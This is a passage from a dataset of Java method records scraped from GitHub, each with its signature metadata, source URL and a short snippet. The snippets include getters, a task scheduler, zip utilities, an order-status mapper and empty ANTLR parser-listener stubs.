"https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58924, "method_name": "getFileSize", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFileSize() {\n        return fileSize;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58925, "method_name": "getOwnerId", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getOwnerId() {\n        return ownerId;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58926, "method_name": "getSha512", "class_name": "Attachment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSha512() {\n        return sha512;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Attachment.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58927, "method_name": "getSegName", "class_name": "SegmentCommand", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSegName() {\n        return new String(segname).trim();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/SegmentCommand.java", "stars": "16", "class_props": {"extends": "LoadCommand", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58928, "method_name": "getVmAddress", "class_name": "SegmentCommand", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "long", "snippet": "    public abstract long getVmAddress();\n\n}\n\n", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/SegmentCommand.java", "stars": "16", "class_props": {"extends": "LoadCommand", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58929, "method_name": "initInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initInternal() throws LifecycleException {\n        initExecutors();\n        initLoadBalancer();\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58930, "method_name": "startInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void startInternal() throws LifecycleException {\n        for (Executor<Task> executor : executors) {\n            executor.start();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58931, "method_name": "stopInternal", "class_name": "StandardScheduler", "params": [], "throws": ["LifecycleException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void stopInternal() throws LifecycleException {\n        for (Executor<Task> executor : executors) {\n            executor.stop();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58932, "method_name": "submit", "class_name": "StandardScheduler", "params": ["Task"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void submit(Task task) {\n        Executor<Task> executor = selectExecutor();\n        executor.execute(task);\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58933, "method_name": "initExecutors", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initExecutors() {\n        int coreSize = Configs.getExecutorsCoreSize() == 0 ? Runtime.getRuntime().availableProcessors()\n                : Configs.getExecutorsCoreSize();\n        executors = new PriorityExecutor[coreSize];\n        for (int i = 0; i < coreSize; i++) {\n            executors[i] = new PriorityExecutor();\n            executors[i].init();\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58934, "method_name": "initLoadBalancer", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initLoadBalancer() {\n        switch (Configs.getLoadBalanceType()) {\n        case WEIGHT_ROUND_ROBIN:\n            loadBalancer = new WeightRoundRobinLoadBalancer();\n            break;\n        default:\n            loadBalancer = new RoundRobinLoadBalancer();\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58935, "method_name": "selectExecutor", "class_name": "StandardScheduler", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Executor<Task>", "snippet": "    private Executor<Task> selectExecutor() {\n        return loadBalancer.select(executors);\n    }", "url": "https://raw.githubusercontent.com/jroutine/jroutine/master/src/main/java/org/coral/jroutine/schedule/StandardScheduler.java", "stars": "3", "class_props": {"extends": "AbstractLifecycle", "implements": ["Scheduler"], "modifiers": ["public"]}}, {"id": 58936, "method_name": "getFileEntriesFromZipByPrefix", "class_name": "ZipUtils", "params": ["ZipInputStream", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "SortedMap<String,byte>", "snippet": "\tpublic static SortedMap<String, byte[]> getFileEntriesFromZipByPrefix( ZipInputStream zis, String prefix )\n    {\n        SortedMap<String, byte[]> result = new TreeMap<String, byte[]>();\n        ZipEntry ze = null;\n        try\n        {\n            while( (ze = zis.getNextEntry()) != null )\n            {\n                String name = ze.getName();\n                if( name.startsWith( prefix ) )\n                {\n                    byte[] data = IOUtils.toByteArray( zis );\n                    result.put( name, data );\n                }\n            }\n        }\n        catch( Exception ex )\n        {\n            ex.printStackTrace();\n        }\n    \n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/ZipUtils.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58937, "method_name": "getEntriesFromZip", "class_name": "ZipUtils", "params": ["ZipInputStream", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "Map<String,byte>", "snippet": "\tpublic static Map<String, byte[]> getEntriesFromZip( ZipInputStream zis, String mask )\n    {\n        Map<String, byte[]> result = new HashMap<String, byte[]>();\n        ZipEntry ze = null;\n        try\n        {\n            while( (ze = zis.getNextEntry()) != null )\n            {\n                String name = ze.getName();\n                if( mask == null || name.indexOf( mask ) >= 0 )\n                {\n                    byte[] data = IOUtils.toByteArray( zis );\n                    result.put( name, data );\n                }\n            }\n        }\n        catch( Exception ex )\n        {\n            ex.printStackTrace();\n        }\n    \n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/util/ZipUtils.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58938, "method_name": "getPrivateKey", "class_name": "WSCloudDevConfig", "params": [], "throws": null, "modifiers": [], "return_type": "String", "snippet": "    String getPrivateKey() {\n        return new String(Base64.getDecoder().decode(privateKey));\n    }", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/main/java/org/dpppt/backend/sdk/ws/config/WSCloudDevConfig.java", "stars": "125", "class_props": {"extends": "WSCloudBaseConfig", "implements": null, "modifiers": ["public"]}}, {"id": 58939, "method_name": "getPublicKey", "class_name": "WSCloudDevConfig", "params": [], "throws": null, "modifiers": [], "return_type": "String", "snippet": "    String getPublicKey() {\n        return new String(Base64.getDecoder().decode(publicKey));\n    }", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-backend/develop/dpppt-backend-sdk/dpppt-backend-sdk-ws/src/main/java/org/dpppt/backend/sdk/ws/config/WSCloudDevConfig.java", "stars": "125", "class_props": {"extends": "WSCloudBaseConfig", "implements": null, "modifiers": ["public"]}}, {"id": 58940, "method_name": "getStatusString", "class_name": "OrderStatusHomeDelivery", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getStatusString(int orderStatus)\n    {\n        String statusString = \"\";\n\n        if(orderStatus==ORDER_PLACED)\n        {\n            statusString = \"Order Placed\";\n        }\n        else if(orderStatus==ORDER_CONFIRMED)\n        {\n            statusString = \"Order Confirmed\";\n        }\n        else if(orderStatus ==ORDER_PACKED)\n        {\n            statusString = \"Order Packed\";\n        }\n        else if(orderStatus==HANDOVER_REQUESTED)\n        {\n            statusString = \"Order Packed\";\n        }\n        else if(orderStatus==OUT_FOR_DELIVERY)\n        {\n            statusString = \"Out for Delivery\";\n        }\n        else if(orderStatus==RETURN_REQUESTED)\n        {\n            statusString = \"Order Returned\";\n        }\n        else if(orderStatus==RETURNED_ORDERS)\n        {\n            statusString = \"Order Returned\";\n        }\n        else if(orderStatus==DELIVERED)\n        {\n            statusString  = \"Delivered\";\n        }\n        else if(orderStatus==PAYMENT_RECEIVED)\n        {\n            statusString = \"Delivered\";\n        }\n        else if(orderStatus==CANCELLED_WITH_DELIVERY_GUY)\n        {\n            statusString = \"Order Cancelled\";\n        }\n        else if(orderStatus==CANCELLED)\n        {\n            statusString = \"Order Cancelled\";\n        }\n\n        return statusString;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelStatusCodes/OrderStatusHomeDelivery.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58941, "method_name": "enterJson", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterJson(MingBdJSONParser.JsonContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58942, "method_name": "exitJson", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitJson(MingBdJSONParser.JsonContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58943, "method_name": "enterValue", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterValue(MingBdJSONParser.ValueContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58944, "method_name": "exitValue", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitValue(MingBdJSONParser.ValueContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58945, "method_name": "enterPair", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterPair(MingBdJSONParser.PairContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58946, "method_name": "exitPair", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitPair(MingBdJSONParser.PairContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58947, "method_name": "enterRuntype", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterRuntype(MingBdJSONParser.RuntypeContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58948, "method_name": "exitRuntype", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitRuntype(MingBdJSONParser.RuntypeContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58949, "method_name": "enterLoad", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterLoad(MingBdJSONParser.LoadContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58950, "method_name": "exitLoad", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitLoad(MingBdJSONParser.LoadContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58951, "method_name": "enterJoin", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterJoin(MingBdJSONParser.JoinContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58952, "method_name": "exitJoin", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitJoin(MingBdJSONParser.JoinContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58953, "method_name": "enterTrans", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterTrans(MingBdJSONParser.TransContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58954, "method_name": "exitTrans", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitTrans(MingBdJSONParser.TransContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58955, "method_name": "enterDataSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterDataSource(MingBdJSONParser.DataSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58956, "method_name": "exitDataSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitDataSource(MingBdJSONParser.DataSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58957, "method_name": "enterMysqlSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterMysqlSource(MingBdJSONParser.MysqlSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58958, "method_name": "exitMysqlSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitMysqlSource(MingBdJSONParser.MysqlSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58959, "method_name": "enterTransinfo", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterTransinfo(MingBdJSONParser.TransinfoContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58960, "method_name": "exitTransinfo", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitTransinfo(MingBdJSONParser.TransinfoContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58961, "method_name": "enterSelect", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterSelect(MingBdJSONParser.SelectContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58962, "method_name": "exitSelect", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitSelect(MingBdJSONParser.SelectContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58963, "method_name": "enterCols", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterCols(MingBdJSONParser.ColsContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58964, "method_name": "exitCols", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitCols(MingBdJSONParser.ColsContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58965, "method_name": "enterCol", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterCol(MingBdJSONParser.ColContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58966, "method_name": "exitCol", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitCol(MingBdJSONParser.ColContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58967, "method_name": "enterFilter", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterFilter(MingBdJSONParser.FilterContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58968, "method_name": "exitFilter", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitFilter(MingBdJSONParser.FilterContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58969, "method_name": "enterSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterSave(MingBdJSONParser.SaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58970, "method_name": "exitSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitSave(MingBdJSONParser.SaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58971, "method_name": "enterSaveInfo", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterSaveInfo(MingBdJSONParser.SaveInfoContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58972, "method_name": "exitSaveInfo", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitSaveInfo(MingBdJSONParser.SaveInfoContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58973, "method_name": "enterKafkaSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterKafkaSave(MingBdJSONParser.KafkaSaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58974, "method_name": "exitKafkaSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitKafkaSave(MingBdJSONParser.KafkaSaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58975, "method_name": "enterMysqlSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterMysqlSave(MingBdJSONParser.MysqlSaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58976, "method_name": "exitMysqlSave", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitMysqlSave(MingBdJSONParser.MysqlSaveContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58977, "method_name": "enterJoinpair", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterJoinpair(MingBdJSONParser.JoinpairContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58978, "method_name": "exitJoinpair", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitJoinpair(MingBdJSONParser.JoinpairContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58979, "method_name": "enterKafkaSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterKafkaSource(MingBdJSONParser.KafkaSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58980, "method_name": "exitKafkaSource", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitKafkaSource(MingBdJSONParser.KafkaSourceContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58981, "method_name": "enterField", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void enterField(MingBdJSONParser.FieldContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58982, "method_name": "exitField", "class_name": "MingBdJSONBaseListener", "params": ["MingBdJSONParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t@Override public void exitField(MingBdJSONParser.FieldContext ctx) { }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONBaseListener.java", "stars": "9", "class_props": {"extends": null, "implements": ["MingBdJSONListener"], "modifiers": ["public"]}}, {"id": 58983, "method_name": "enterEveryRule", 